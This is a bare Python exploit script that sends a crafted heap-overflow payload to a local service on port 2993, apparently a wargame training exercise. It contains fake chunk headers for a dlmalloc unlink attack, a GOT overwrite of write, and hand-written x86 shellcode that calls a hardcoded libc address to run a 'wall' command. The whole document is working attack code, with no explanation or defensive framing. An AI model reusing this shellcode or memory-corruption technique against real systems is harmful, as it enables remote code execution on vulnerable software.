import socket, struct, sys

pack = lambda dword: struct.pack("I", dword)
TARGET=("127.0.0.1", 2993)
got_write=0x804d41c-12
mem=0x804e010
F="".join([pack(dword) for dword in [0xfffffffc, 0xfffffffc, got_write, mem]])
S="\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
S+="\x31\xc0"+\
"\x50"+\
"\xb8\x20\x6c\x6f\x6c"+\
"\x50"+\
"\xb8\x77\x61\x6c\x6c"+\
"\x50"+\
"\xb8\x62\x69\x6e\x2f"+\
"\x50"+\
"\xb8\x2f\x2e\x2e\x2f"+\
"\x50"+\
"\xb8\x2f\x62\x69\x6e"+\
"\x50"+\
"\xb8\x2f\x75\x73\x72"+\
"\x50"+\
"\x89\xe0"+\
"\x50"+\
"\x8d\x05\xb0\xff\xec\xb7"+\
"\xff\xd0"+\
"\xff\xff\xff\xff"
s=socket.create_connection(TARGET)
payload='FSRD'+S+'A'*(123-len(S))+'/' + 'FSRD'+'ROOT/'+F+'B'*(119-len(F))
s.sendall(payload)
s.close()
